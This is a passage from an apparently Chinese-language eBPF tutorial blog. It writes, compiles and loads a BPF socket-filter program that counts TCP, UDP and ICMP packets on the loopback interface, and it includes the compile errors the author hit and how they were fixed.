class="number">0</span>;</span><br></pre></td></tr></table></figure><p>代码所做的第一件事是在节头和内部变量之间创建关联——就像<code>SEC(&quot;socket&quot;)</code>一样，我们最终会得到<code>bool is_socket=true</code></p><p>之后在同一个文件中，我们看到了一组if指令，它们创建了header和实际<code>prog_type</code>之间的关联，因此对于<code>is_socket</code>，我们最终得到<code>BPF_PROG_TYPE_SOCKET_FILTER</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (is_socket) &#123;</span><br><span class="line">prog_type = BPF_PROG_TYPE_SOCKET_FILTER;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (is_kprobe || is_kretprobe) &#123; </span><br><span class="line">  prog_type = BPF_PROG_TYPE_KPROBE;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (is_tracepoint) &#123;</span><br><span class="line">prog_type = BPF_PROG_TYPE_TRACEPOINT;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (is_raw_tracepoint) &#123;</span><br><span class="line">prog_type = BPF_PROG_TYPE_RAW_TRACEPOINT;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (is_xdp) &#123;</span><br><span class="line">prog_type = BPF_PROG_TYPE_XDP;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (is_perf_event) &#123;</span><br><span class="line">prog_type = BPF_PROG_TYPE_PERF_EVENT;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (is_cgroup_skb) &#123;</span><br><span class="line">prog_type = BPF_PROG_TYPE_CGROUP_SKB;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (is_cgroup_sk) &#123;</span><br><span class="line">prog_type = BPF_PROG_TYPE_CGROUP_SOCK;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (is_sockops) &#123;</span><br><span class="line">prog_type = BPF_PROG_TYPE_SOCK_OPS;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (is_sk_skb) &#123;</span><br><span class="line">prog_type = BPF_PROG_TYPE_SK_SKB;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (is_sk_msg) &#123;</span><br><span class="line">prog_type = BPF_PROG_TYPE_SK_MSG;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Unknown event '%s'\n"</span>, event); </span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为我们想编写一个<code>BPF_PROG_TYPE_SOCKET_FILTER</code>程序，我们需要指定一个<code>SEC(&quot;socket&quot;)</code>作为我们函数的ELF头，它将作为BPF程序的入口点。</p><p>正如从该列表中看到的那样，有多种与套接字和一般网络操作相关的程序类型。在本章中，我们将展示<code>BPF_PROG_TYPE_SOCKET_FILTER</code>的示例；此外，后面我们将讨论程序类型为 <code>BPF_PROG_TYPE_XDP</code>的XDP程序。</p><p>我们想要存储遇到的每个协议的数据包计数，需要创建一个键/值映射，其中协议是键，数据包计数为值。为此可以使用<code>BPF_MAP_TYPE_ARRAY</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct bpf_map_def <span class="title">SEC</span><span class="params">(<span class="string">"maps"</span>)</span> countmap </span>= &#123; </span><br><span class="line">  .type = BPF_MAP_TYPE_ARRAY,</span><br><span class="line">.key_size = <span class="keyword">sizeof</span>(<span class="keyword">int</span>),</span><br><span class="line">.value_size = <span class="keyword">sizeof</span>(<span class="keyword">int</span>), </span><br><span class="line">  .max_entries = <span class="number">256</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>该映射是使用<code>bpf_map_def</code>结构定义的，它将被命名为<code>countmap</code>以供程序中引用。</p><p>此时，我们可以编写一些代码来实际计算数据包。<code>BPF_PROG_TYPE_SOCKET_FILTER</code>类型的程序是我们的选择之一，因为通过使用这样的程序，我们可以看到所有流经接口的数据包。因此我们使用<code>SEC(&quot;socket&quot;)</code>将程序附加到正确的头部：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">SEC(<span class="string">"socket"</span>)</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">socket_prog</span><span class="params">(struct __sk_buff *skb)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> proto = load_byte(skb, ETH_HLEN + offsetof(struct iphdr, protocol)); <span class="keyword">int</span> one=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> *el = bpf_map_lookup_elem(&amp;countmap, &amp;proto);</span><br><span class="line"><span class="keyword">if</span> (el) &#123;</span><br><span class="line">(*el)++; </span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">el = &amp;one; </span><br><span class="line">  &#125;</span><br><span class="line">  bpf_map_update_elem(&amp;countmap, &amp;proto, el, BPF_ANY);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在ELF头附加之后，我们可以使用<code>load_byte</code>函数从<code>sk_buff</code>结构中提取协议部分。然后使用协议ID作为键来执行<code>bpf_map_lookup_elem</code>操作以从计数映射中提取当前计数器值，以便我们可以将其递增，如果它是第一个数据包，我们可以将其设置为1。现在我们可以使用 <code>bpf_map_update_elem</code>用增加的值更新映射。</p><p>完整的<code>bpf_program.c</code>程序如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/if_ether.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/if_packet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/ip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/tcp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/udp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> offsetof</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> offsetof(TYPE, MEMBER) ((size_t) &amp; ((TYPE *)0)-&gt;MEMBER)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SEC(NAME) __attribute__((section(NAME), used)) </span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_def</span> &#123;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> type;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> key_size;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> value_size;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> max_entries;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> map_flags;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">int</span> <span class="params">(*bpf_map_update_elem)</span><span class="params">(struct bpf_map_def *<span class="built_in">map</span>, <span class="keyword">void</span> *key,</span></span></span><br><span class="line"><span class="function"><span class="params">                                  <span class="keyword">void</span> *value, __u64 flags)</span> </span>= (<span class="keyword">void</span> *)</span><br><span class="line">    BPF_FUNC_map_update_elem;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> *(*bpf_map_lookup_elem)(struct bpf_map_def *<span class="built_in">map</span>, <span class="keyword">void</span> *key) =</span><br><span class="line">    (<span class="keyword">void</span> *)BPF_FUNC_map_lookup_elem;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="title">load_byte</span><span class="params">(<span class="keyword">void</span> *skb,</span></span></span><br><span class="line"><span class="function"><span class="params">                             <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> off)</span> <span class="title">asm</span><span class="params">(<span class="string">"llvm.bpf.load.byte"</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">struct bpf_map_def <span class="title">SEC</span><span class="params">(<span class="string">"maps"</span>)</span> countmap </span>= &#123;</span><br><span class="line">    .type = BPF_MAP_TYPE_ARRAY,</span><br><span class="line">    .key_size = <span class="keyword">sizeof</span>(<span class="keyword">int</span>),</span><br><span class="line">    .value_size = <span class="keyword">sizeof</span>(<span class="keyword">int</span>),</span><br><span class="line">    .max_entries = <span class="number">256</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">SEC(<span class="string">"socket"</span>)</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">socket_prog</span><span class="params">(struct __sk_buff *skb)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> proto = load_byte(skb, ETH_HLEN + offsetof(struct iphdr, protocol));</span><br><span class="line">  <span class="keyword">int</span> one = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">int</span> *el = bpf_map_lookup_elem(&amp;countmap, &amp;proto);</span><br><span class="line">  <span class="keyword">if</span> (el) &#123;</span><br><span class="line">    (*el)++;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    el = &amp;one;</span><br><span class="line">  &#125;</span><br><span class="line">  bpf_map_update_elem(&amp;countmap, &amp;proto, el, BPF_ANY);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> _license[] SEC(<span class="string">"license"</span>) = <span class="string">"GPL"</span>;</span><br></pre></td></tr></table></figure><p>编译如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt6]# clang -O2 -target bpf -c bpf_program.c -o bpf_program.o</span><br></pre></td></tr></table></figure><p>报错如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt6]# clang -O2 -target bpf -c bpf_program.c -o bpf_program.o</span><br><span class="line">In file included from bpf_program.c:6:</span><br><span class="line">In file included from /usr/include/linux/string.h:7:</span><br><span class="line">In file included from /usr/include/string.h:26:</span><br><span class="line">In file included from /usr/include/bits/libc-header-start.h:33:</span><br><span class="line">In file included from /usr/include/features.h:452:</span><br><span class="line">/usr/include/gnu/stubs.h:7:11: fatal error: 'gnu/stubs-32.h' file not found</span><br><span class="line"><span class="meta">#</span> include &lt;gnu/stubs-32.h&gt;</span><br><span class="line">          ^~~~~~~~~~~~~~~~</span><br><span class="line">1 error generated.</span><br></pre></td></tr></table></figure><p>解决办法如下</p><p><a href="https://github.com/cilium/cilium/issues/368" target="_blank" rel="noopener">https://github.com/cilium/cilium/issues/368</a></p><p>重新编译</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt6]# clang -O2 -target bpf -c bpf_program.c -o bpf_program.o</span><br></pre></td></tr></table></figure><h5 id="加载并附加到网络接口"><a href="#加载并附加到网络接口" class="headerlink" title="加载并附加到网络接口"></a>加载并附加到网络接口</h5><p>加载程序是实际打开我们编译的BPF ELF二进制文件<code>bpf_program.o</code>的程序，并将定义的BPF程序及其映射附加到一个套接字，该套接字是针对所观察的接口创建的，在我们的例子中是环回接口。</p><p>loader最重要的部分是ELF文件的加载：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (load_bpf_file(filename)) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>, bpf_log_buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  sock = open_raw_sock(<span class="string">"lo"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (setsockopt(sock, SOL_SOCKET, SO_ATTACH_BPF, prog_fd,</span><br><span class="line">                 <span class="keyword">sizeof</span>(prog_fd[<span class="number">0</span>]))) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"setsockopt %s\n"</span>, strerror(errno));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>这将通过添加一个元素来填充<code>prog_fd</code>数组，该元素是我们加载的程序的文件描述符，我们现在可以将其附加到使用<code>open_raw_sock</code>打开的环回接口的套接字描述符上。</p><p>通过将选项<code>SO_ATTACH_BPF</code>设置为为接口打开的原始套接字来完成附加。</p><p>此时，我们的用户空间加载器能够在内核发送映射元素时查找它们：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">    key = IPPROTO_TCP;</span><br><span class="line">    assert(bpf_map_lookup_elem(map_fd[<span class="number">0</span>], &amp;key, &amp;tcp_cnt) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    key = IPPROTO_UDP;</span><br><span class="line">    assert(bpf_map_lookup_elem(map_fd[<span class="number">0</span>], &amp;key, &amp;udp_cnt) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    key = IPPROTO_ICMP;</span><br><span class="line">    assert(bpf_map_lookup_elem(map_fd[<span class="number">0</span>], &amp;key, &amp;icmp_cnt) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"TCP %d UDP %d ICMP %d packets\n"</span>, tcp_cnt, udp_cnt, icmp_cnt);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>为了进行查找，我们使用for循环和<code>bpf_map_look_elem</code>附加到数组映射，以便我们可以分别读取和打印TCP、UDP和ICMP数据包计数器的值</p><p><code>loader.c</code>程序完整代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bpf/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bpf/bpf_load.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bpf/sock_example.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/if_ether.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> bpf_log_buf[BPF_LOG_BUF_SIZE];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> sock = <span class="number">-1</span>, i, key;</span><br><span class="line">  <span class="keyword">int</span> tcp_cnt, udp_cnt, icmp_cnt;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span> filename[<span class="number">256</span>];</span><br><span class="line">  <span class="built_in">snprintf</span>(filename, <span class="keyword">sizeof</span>(filename), <span class="string">"%s"</span>, argv[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (load_bpf_file(filename)) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>, bpf_log_buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  sock = open_raw_sock(<span class="string">"lo"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (setsockopt(sock, SOL_SOCKET, SO_ATTACH_BPF, prog_fd,</span><br><span class="line">                 <span class="keyword">sizeof</span>(prog_fd[<span class="number">0</span>]))) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"setsockopt %s\n"</span>, strerror(errno));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">    key = IPPROTO_TCP;</span><br><span class="line">    assert(bpf_map_lookup_elem(map_fd[<span class="number">0</span>], &amp;key, &amp;tcp_cnt) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    key = IPPROTO_UDP;</span><br><span class="line">    assert(bpf_map_lookup_elem(map_fd[<span class="number">0</span>], &amp;key, &amp;udp_cnt) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    key = IPPROTO_ICMP;</span><br><span class="line">    assert(bpf_map_lookup_elem(map_fd[<span class="number">0</span>], &amp;key, &amp;icmp_cnt) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"TCP %d UDP %d ICMP %d packets\n"</span>, tcp_cnt, udp_cnt, icmp_cnt);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为这个程序使用的是<code>libbpf</code>，所以我们需要在下载的源码中编译它：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos bpf]# pwd</span><br><span class="line">/root/linux-5.4/tools/lib/bpf</span><br><span class="line">[root@VM-16-14-centos bpf]# make</span><br><span class="line">Auto-detecting system features:</span><br><span class="line">...                        libelf: [ on  ]</span><br><span class="line">...                           bpf: [ on  ]</span><br><span class="line"></span><br><span class="line">  HOSTCC   fixdep.o</span><br><span class="line">  HOSTLD   fixdep-in.o</span><br><span class="line">  LINK     fixdep</span><br><span class="line">  MKDIR    staticobjs/</span><br></pre></td></tr></table></figure><p>接着我们可以使用如下脚本编译加载器：</p><p><code>build-loader.sh</code>代码如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">KERNEL_SRCTREE=$1</span><br><span class="line">LIBBPF=$&#123;KERNEL_SRCTREE&#125;/tools/lib/bpf/libbpf.a</span><br><span class="line">clang -o loader-bin -I$&#123;KERNEL_SRCTREE&#125;/tools/lib/bpf/ \</span><br><span class="line"><span class="meta">  -I$</span>&#123;KERNEL_SRCTREE&#125;/tools/lib -I$&#123;KERNEL_SRCTREE&#125;/tools/include \</span><br><span class="line"><span class="meta">  -I$</span>&#123;KERNEL_SRCTREE&#125;/tools/perf -I$&#123;KERNEL_SRCTREE&#125;/samples \</span><br><span class="line"><span class="meta">  $</span>&#123;KERNEL_SRCTREE&#125;/samples/bpf/bpf_load.c \</span><br><span class="line">  loader.c "$&#123;LIBBPF&#125;" -lelf</span><br></pre></td></tr></table></figure><p>该脚本包含一堆头文件和内核本身的<code>libbpf</code>库，因此它必须知道在哪里可以找到内核源码。 为此可以在其中替换<code>$KERNEL_SRCTREE</code>或将该脚本写入文件并使用它：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt6]# ./build-loader.sh /root/linux-5.4</span><br></pre></td></tr></table></figure><p>报错如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/tmp/loader-19267c.o:(.bss+0x0): multiple definition of `bpf_log_buf&apos;</span><br><span class="line">/tmp/bpf_load-33a95f.o:(.bss+0x1000): first defined here</span><br><span class="line">clang-12: error: linker command failed with exit code 1 (use -v to see invocation)</span><br></pre></td></tr></table></figure><p>解决方法如下</p><p><a href="https://stackoverflow.com/questions/12511044/bss0x0-multiple-definition-of-proxies" target="_blank" rel="noopener">https://stackoverflow.com/questions/12511044/bss0x0-multiple-definition-of-proxies</a></p><p>即在全局变量前声明<code>extern</code>，这里我们在<code>char bpf_log_buf[BPF_LOG_BUF_SIZE]</code>处声明</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span> bpf_log_buf[BPF_LOG_BUF_SIZE];</span><br></pre></td></tr></table></figure><p>之后重新编译会创建一个<code>loader-bin</code>文件，最终可以启动BPF程序的ELF文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt6]# ./loader-bin bpf_program.o</span><br></pre></td></tr></table></figure><p>程序加载并启动后，将执行10次转储，每秒一次显示三个协议中的每一个的数据包计数。因为程序连接到环回设备<code>lo</code>，所以你可以与加载程序一起运行ping并看到ICMP计数器增加。</p><p>运行ping来生成到<code>localhost</code>的ICMP流量：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt6]# ping -c 100 127.0.0.1</span><br></pre></td></tr></table></figure><p>输出如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.</span><br><span class="line"> 64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.100 ms</span><br><span class="line"> 64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.107 ms</span><br><span class="line"> 64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.093 ms</span><br><span class="line"> 64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.102 ms</span><br><span class="line"> 64 bytes from 127.0.0.1: icmp_seq=5 ttl=64 time=0.105 ms</span><br><span class="line"> 64 bytes from 127.0.0.1: icmp_seq=6 ttl=64 time=0.093 ms</span><br><span class="line"> 64 bytes from 127.0.0.1: icmp_seq=7 ttl=64 time=0.104 ms</span><br><span class="line"> 64 bytes from 127.0.0.1: icmp_seq=8 ttl=64 time=0.142 ms</span><br></pre></td></tr></table></figure><p>在另一个终端中运行我们的BPF程序：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt6]# ./loader-bin bpf_program.o</span><br><span class="line"> TCP 0 UDP 0 ICMP 0 packets</span><br><span class="line">    TCP 0 UDP 0 ICMP 4 packets</span><br><span class="line">    TCP 0 UDP 0 ICMP 8 packets</span><br><span class="line">    TCP 0 UDP 0 ICMP 12 packets</span><br><span class="line">    TCP 0 UDP 0 ICMP 16 packets</span><br><span class="line">    TCP 0 UDP 0 ICMP 20 packets</span><br><span class="line">    TCP 0 UDP 0 ICMP 24 packets</span><br><span class="line">    TCP 0 UDP 0 ICMP 28 